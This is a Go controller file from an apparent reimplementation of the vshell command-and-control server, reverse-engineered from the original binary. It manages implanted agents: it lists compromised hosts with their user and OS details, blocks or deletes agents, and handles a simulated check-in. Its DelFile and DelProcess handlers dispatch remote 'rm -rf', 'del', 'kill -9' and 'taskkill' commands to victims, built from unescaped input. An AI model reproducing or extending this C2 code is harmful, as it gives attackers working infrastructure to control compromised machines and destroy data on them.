package controllers

import (
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"vshell/c2engine"
	"vshell/models"
)

// ============================================================================
// Client Blocklist — reverse-engineered from original vshell binary
// ============================================================================
//
// The original binary maintains a blocklist of client IDs that are prevented
// from reconnecting. When a client is blocked:
//   1. Its active connections are dropped via CutConn()
//   2. Its ID is added to the blocklist
//   3. Future check-in attempts from the blocked client are rejected
//   4. The block persists across restarts (stored in DB/JSON)
//
// Ghidra pclntab evidence:
//   nTApp6jPzv.(*ClientController).Block   @ 0x1dcd43a1
//   nTApp6jPzv.(*ClientController).Unblock @ 0x1dcd43c1
//   nTApp6jPzv.(*ClientController).DelFile @ 0x1dcd3fb4
//   nTApp6jPzv.(*ClientController).DelProcess @ 0x1dcd43d9

var (
	blocklist   = make(map[int64]bool)   // clientID -> blocked
	blocklistMu sync.RWMutex
	// blockedKeysByID remembers each blocked client's verify key so Unblock
	// can clear the engine-level key blocklist.
	blockedKeysByID = make(map[int64]string)
)

// IsBlocked checks if a client ID is in the blocklist.
// Called during agent check-in to reject previously blocked agents.
func IsBlocked(clientID int64) bool {
	blocklistMu.RLock()
	defer blocklistMu.RUnlock()
	return blocklist[clientID]
}

// BlockClient adds a client to the blocklist and drops its connections.
// Called from ClientController.Block() and API handlers.
func BlockClient(clientID int64) error {
	engine := c2engine.GetEngine()
	client := engine.GetClient(clientID)
	if client == nil {
		return fmt.Errorf("client %d not found", clientID)
	}

	// 1. Block by verify key too: real check-ins funnel through
	// engine.NewClient, which rejects blocked keys even after DelClient below
	// deletes the client record and its vkeyIndex entry (a re-check-in would
	// otherwise get a fresh ID the ID-keyed blocklist can never match).
	if client.VerifyKey != "" {
		engine.BlockKey(client.VerifyKey)
	}
	blocklistMu.Lock()
	blocklist[clientID] = true
	blockedKeysByID[clientID] = client.VerifyKey
	blocklistMu.Unlock()

	// 2. Drop all active connections — original binary calls CutConn()
	client.CutConn()

	// 3. Mark as disconnected
	client.IsConnect = false
	client.NowConn = 0

	// 4. Persist block status via engine
	engine.DelClient(clientID)

	log.Printf("[Block] Client %d blocked, connections dropped", clientID)
	return nil
}

// UnblockClient removes a client from the blocklist.
func UnblockClient(clientID int64) {
	blocklistMu.Lock()
	key := blockedKeysByID[clientID]
	delete(blockedKeysByID, clientID)
	delete(blocklist, clientID)
	blocklistMu.Unlock()
	if key != "" {
		c2engine.GetEngine().UnblockKey(key)
	}
	log.Printf("[Block] Client %d unblocked", clientID)
}

// LoadBlocklist loads blocked client IDs from database on startup.
func LoadBlocklist() {
	db := models.GetDB()
	if db == nil {
		return
	}
	// Blocked clients are those marked with Status=false in the original binary
	blockedIDs, err := db.GetBlockedClientIDs()
	if err != nil {
		log.Printf("[Block] Failed to load blocklist: %v", err)
		return
	}
	blocklistMu.Lock()
	engine := c2engine.GetEngine()
	for _, id := range blockedIDs {
		blocklist[id] = true
		// Register the key block so real check-ins stay rejected after a restart.
		if c := engine.GetClient(id); c != nil && c.VerifyKey != "" {
			blockedKeysByID[id] = c.VerifyKey
			engine.BlockKey(c.VerifyKey)
		}
	}
	blocklistMu.Unlock()
	log.Printf("[Block] Loaded %d blocked client(s) from database", len(blockedIDs))
}

// ============================================================================
// ClientController — enhanced with actual Block/Unblock, DelFile, DelProcess
// ============================================================================

// ClientController manages connected agents/clients
type ClientController struct {
	BaseController
}

// Get lists all clients (both DB and online)
func (c *ClientController) Get() {
	db := models.GetDB()
	if db == nil {
		c.JSONErr("Database not initialized")
		return
	}

	clients, err := db.ListClients()
	if err != nil {
		c.JSONErr(err.Error())
		return
	}

	if clients == nil {
		clients = []*models.Client{}
	}

	// The engine is the live source of truth: agents that checked in via a C2
	// listener exist there (with the IDs command dispatch needs) but are NOT
	// necessarily persisted to the models DB yet. Without merging, the web
	// client page would silently miss every live-checked-in agent. Merge
	// engine clients first (engine IDs so dispatch works), then append any
	// models clients that aren't already represented.
	engine := c2engine.GetEngine()
	engineClients := engine.GetClientList()

	// Enrich with online status and block status
	type ClientEx struct {
		models.Client
		Online           bool   `json:"online"`
		Blocked          bool   `json:"blocked"`
		LastSeenRelative string `json:"last_seen_relative"`
	}

	result := make([]ClientEx, 0, len(clients)+len(engineClients))
	now := time.Now()
	seen := make(map[string]bool) // dedupe key: verify key (or identity)

	// clientDedupKey returns a stable identity key. Addr is deliberately NOT
	// used: the engine overwrites it with each re-checkin's RemoteAddr (which
	// includes the ephemeral source port), so an Addr-based key would split one
	// agent into two rows the moment it reconnects.
	clientDedupKey := func(cl *models.Client) string {
		if cl.VerifyKey != "" {
			return "v:" + cl.VerifyKey
		}
		return "i:" + cl.HostName + "|" + cl.UserName
	}

	appendClient := func(cl *models.Client) {
		if cl == nil {
			return
		}
		key := clientDedupKey(cl)
		if seen[key] {
			return
		}
		seen[key] = true

		blocklistMu.RLock()
		blocked := blocklist[cl.ID]
		blocklistMu.RUnlock()

		online := IsClientOnline(cl.ID)

		// Compute relative last-seen time
		lastSeenRel := ""
		if !cl.LastSeen.IsZero() {
			diff := now.Sub(cl.LastSeen)
			switch {
			case diff < time.Minute:
				lastSeenRel = fmt.Sprintf("%ds", int(diff.Seconds()))
			case diff < time.Hour:
				lastSeenRel = fmt.Sprintf("%dm", int(diff.Minutes()))
			case diff < 24*time.Hour:
				lastSeenRel = fmt.Sprintf("%dh", int(diff.Hours()))
			default:
				lastSeenRel = fmt.Sprintf("%dd", int(diff.Hours()/24))
			}
		}

		result = append(result, ClientEx{
			Client:           *cl,
			Online:           online,
			Blocked:          blocked,
			LastSeenRelative: lastSeenRel,
		})
	}

	// 1. Live engine clients (engine IDs → command dispatch works).
	for _, ec := range engineClients {
		appendClient(engineClientToModel(ec))
	}
	// 2. Persisted models clients not already shown (e.g. no longer in engine).
	for _, cl := range clients {
		appendClient(cl)
	}

	// The original binary wraps the page with client counts:
	// {"code":0,"message":"ok","result":{"clientCount":N,
	//  "clientOnlineCount":N,"items":[...],"total":N},"type":"success"}
	onlineCount := 0
	for _, cl := range result {
		if cl.Online {
			onlineCount++
		}
	}
	c.JSONOk(map[string]interface{}{
		"clientCount":       len(result),
		"clientOnlineCount": onlineCount,
		"items":             result,
		"total":             len(result),
	})
}

// engineClientToModel converts an engine client record into the models.Client
// shape used by the web client list. The engine and models structs share the
// same JSON field tags; engine IDs are preserved so command dispatch (which
// addresses clients by engine ID) keeps working for live agents.
func engineClientToModel(ec *c2engine.Client) *models.Client {
	if ec == nil {
		return nil
	}
	return &models.Client{
		ID:            ec.ID,
		IsConnect:     ec.IsConnect,
		VerifyKey:     ec.VerifyKey,
		Type:          ec.Type,
		Addr:          ec.Addr,
		Remark:        ec.Remark,
		Status:        ec.Status,
		LocalIP:       ec.LocalIP,
		UserName:      ec.UserName,
		HostName:      ec.HostName,
		Location:      ec.Location,
		OsName:        ec.OsName,
		ProcessName:   ec.ProcessName,
		PingCheckTime: ec.PingCheckTime,
		RateLimit:     ec.RateLimit,
		NoStore:       ec.NoStore,
		NoDisplay:     ec.NoDisplay,
		MaxConn:       ec.MaxConn,
		NowConn:       ec.NowConn,
		CreatedAt:     ec.CreatedAt,
		LastSeen:      ec.LastSeen,
	}
}

// Delete removes a client from the database and engine.
func (c *ClientController) Delete() {
	id, _ := c.GetInt64("id")

	// Remove from engine first (drops connections)
	engine := c2engine.GetEngine()
	engine.DelClient(id)

	// Remove from database
	db := models.GetDB()
	if db != nil {
		if err := db.DeleteClient(id); err != nil {
			c.JSONErr("Failed to delete: " + err.Error())
			return
		}
	}

	// Also remove from blocklist
	blocklistMu.Lock()
	delete(blocklist, id)
	blocklistMu.Unlock()

	c.JSONOk(map[string]interface{}{"deleted_id": id})
}

// Block blocks a client — adds to blocklist, drops connections.
// POST /api/client/block
//
// The original binary:
//  1. Marks client.Status = false in database
//  2. Cuts all active connections via Client.CutConn()
//  3. Sends a close signal to the agent
//  4. Prevents future reconnections
func (c *ClientController) Block() {
	id, _ := c.GetInt64("id")
	if id == 0 {
		c.JSONErr("client id required")
		return
	}

	// Persist block status in database
	db := models.GetDB()
	if db != nil {
		if err := db.BlockClient(id); err != nil {
			c.JSONErr("Failed to block client: " + err.Error())
			return
		}
	}

	if err := BlockClient(id); err != nil {
		// Non-fatal — the DB persisted the block even if connection drop fails
		log.Printf("[Block] Client %d: block persisted but connection drop failed: %v", id, err)
	}

	c.JSONOk(map[string]interface{}{
		"blocked_id": id,
		"status":     "blocked",
	})
}

// Unblock unblocks a client — removes from blocklist, allows reconnection.
// POST /api/client/unblock
func (c *ClientController) Unblock() {
	id, _ := c.GetInt64("id")
	if id == 0 {
		c.JSONErr("client id required")
		return
	}

	// Persist unblock in database
	db := models.GetDB()
	if db != nil {
		if err := db.UnblockClient(id); err != nil {
			c.JSONErr("Failed to unblock client: " + err.Error())
			return
		}
	}

	UnblockClient(id)

	c.JSONOk(map[string]interface{}{
		"unblocked_id": id,
		"status":       "unblocked",
	})
}

// Note sets a remark/note on a client and persists to database.
// POST /api/client/note
//
// The original binary stores remarks in the database client record
// and updates the in-memory client object simultaneously.
func (c *ClientController) Note() {
	id, _ := c.GetInt64("id")
	remark := c.GetString("remark")

	if id == 0 {
		c.JSONErr("client id required")
		return
	}

	// Persist remark to database
	db := models.GetDB()
	if db != nil {
		if err := db.UpdateClientRemark(id, remark); err != nil {
			log.Printf("[Client] Failed to save remark for client %d: %v", id, err)
			// Non-fatal: the UI shows the new remark even if DB write fails
		}
	}

	// Also update in-memory c2engine client
	engine := c2engine.GetEngine()
	if client := engine.GetClient(id); client != nil {
		client.Remark = remark
	}

	c.JSONOk(map[string]interface{}{
		"client_id": id,
		"remark":    remark,
	})
}

// CheckIn handles a simulated client check-in (for testing).
// POST /api/client/checkin
func (c *ClientController) CheckIn() {
	var req struct {
		VerifyKey string `json:"verify_key"`
		HostName  string `json:"hostname"`
		UserName  string `json:"username"`
		OsName    string `json:"os"`
		LocalIP   string `json:"local_ip"`
	}
	if !parseJSONBody(c.Ctx.Request, &req) {
		req.VerifyKey = c.GetString("verify_key")
		req.HostName = c.GetString("hostname", "test-client")
		req.UserName = c.GetString("username", "root")
		req.OsName = c.GetString("os", "linux")
		req.LocalIP = c.GetString("local_ip", "10.0.0.1")
	}

	// Check blocklist
	engine := c2engine.GetEngine()
	if existingID, ok := engine.GetIdByVerifyKey(req.VerifyKey); ok {
		if IsBlocked(existingID) {
			c.JSONOk(map[string]interface{}{
				"status":  "blocked",
				"message": "Client is blocked",
			})
			return
		}
		// Update existing client
		client := engine.GetClient(existingID)
		if client != nil {
			client.UpdateSeen()
		}
		c.JSONOk(map[string]interface{}{
			"status":    "updated",
			"client_id": existingID,
		})
		return
	}

	db := models.GetDB()
	if db == nil {
		c.JSONOk(map[string]interface{}{"status": "error", "message": "no db"})
		return
	}

	client := &models.Client{
		IsConnect:     true,
		VerifyKey:     req.VerifyKey,
		Type:          "http",
		Addr:          c.Ctx.Request.RemoteAddr,
		Status:        true,
		LocalIP:       req.LocalIP,
		UserName:      req.UserName,
		HostName:      req.HostName,
		OsName:        req.OsName,
		ProcessName:   "vshell_agent",
		NowConn:       1,
		PingCheckTime: time.Now().Unix(),
	}
	id, err := db.CreateClient(client)
	if err != nil {
		c.JSONErr(err.Error())
		return
	}
	client.ID = id
	c.JSONOk(map[string]interface{}{
		"status":    "registered",
		"client_id": id,
	})
}

// DelFile dispatches a file deletion command to a client agent.
// POST /api/client/delfile
// Body: {"id": <client_id>, "paths": "file1.txt,file2.txt"}
//
// Ghidra pclntab: nTApp6jPzv.(*ClientController).DelFile @ 0x1dcd3fb4
func (c *ClientController) DelFile() {
	id, _ := c.GetInt64("id")
	paths := c.GetString("paths")

	if id == 0 || paths == "" {
		c.JSONErr("client id and paths required")
		return
	}

	// Build delete command: remove files on the agent's filesystem
	cmd := buildFileDeleteCommand(paths)
	cmdID, err := DispatchCommand(id, cmd, 30)
	if err != nil {
		c.JSONErr("Failed to dispatch delete command: " + err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  id,
		"command_id": cmdID,
		"paths":      paths,
		"status":     "dispatched",
	})
}

// DelProcess dispatches a process kill command to a client agent.
// POST /api/client/delprocess
// Body: {"id": <client_id>, "pid": 1234, "name": "process_name"}
//
// Ghidra pclntab: nTApp6jPzv.(*ClientController).DelProcess @ 0x1dcd43d9
func (c *ClientController) DelProcess() {
	id, _ := c.GetInt64("id")
	pid, _ := c.GetInt("pid", 0)
	processName := c.GetString("name")

	if id == 0 {
		c.JSONErr("client id required")
		return
	}

	// Build process termination command
	var cmd string
	if pid > 0 {
		cmd = fmt.Sprintf("kill -9 %d 2>/dev/null || taskkill /F /PID %d", pid, pid)
	} else if processName != "" {
		cmd = fmt.Sprintf("pkill -9 %s 2>/dev/null || taskkill /F /IM %s", processName, processName)
	} else {
		c.JSONErr("pid or process name required")
		return
	}

	cmdID, err := DispatchCommand(id, cmd, 15)
	if err != nil {
		c.JSONErr("Failed to dispatch kill command: " + err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  id,
		"command_id": cmdID,
		"pid":        pid,
		"name":       processName,
		"status":     "dispatched",
	})
}

// Dellist dispatches a batch delete command to remove multiple clients.
// POST /api/client/dellist
// Body: {"ids": "1,2,3"}
// DelList is the original binary's method name for batch delete
// (nTApp6jPzv.(*ClientController).DelList); Dellist is the router alias.
func (c *ClientController) DelList() { c.Dellist() }

func (c *ClientController) Dellist() {
	idsStr := c.GetString("ids")
	if idsStr == "" {
		c.JSONErr("ids required")
		return
	}

	engine := c2engine.GetEngine()
	db := models.GetDB()
	deleted := make([]int64, 0)

	for _, idStr := range splitTrim(idsStr, ",") {
		var id int64
		fmt.Sscanf(idStr, "%d", &id)
		if id == 0 {
			continue
		}
		engine.DelClient(id)
		if db != nil {
			db.DeleteClient(id)
		}
		// Clean blocklist
		blocklistMu.Lock()
		delete(blocklist, id)
		blocklistMu.Unlock()
		deleted = append(deleted, id)
	}

	c.JSONOk(map[string]interface{}{
		"deleted": deleted,
		"count":   len(deleted),
	})
}

// ============================================================================
// Helper: build file deletion command for agent dispatch
// ============================================================================

func buildFileDeleteCommand(paths string) string {
	// Build cross-platform file deletion command
	// The original binary uses shell commands dispatched to the agent
	pathList := splitTrim(paths, ",")
	if len(pathList) == 0 {
		return ""
	}

	// Single path
	if len(pathList) == 1 {
		return fmt.Sprintf("rm -rf %s 2>/dev/null || del /F /Q %s 2>nul", pathList[0], pathList[0])
	}

	// Multiple paths — build a compound command
	cmd := "rm -rf"
	for _, p := range pathList {
		cmd += " " + p
	}
	cmd += " 2>/dev/null"
	return cmd
}

func splitTrim(s, sep string) []string {
	parts := strings.Split(s, sep)
	result := make([]string, 0, len(parts))
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part != "" {
			result = append(result, part)
		}
	}
	return result
}

// ============================================================================
// Ensure blocklist is loaded on first use
// ============================================================================

var blocklistInit sync.Once

func init() {
	blocklistInit.Do(func() {
		LoadBlocklist()
	})
}
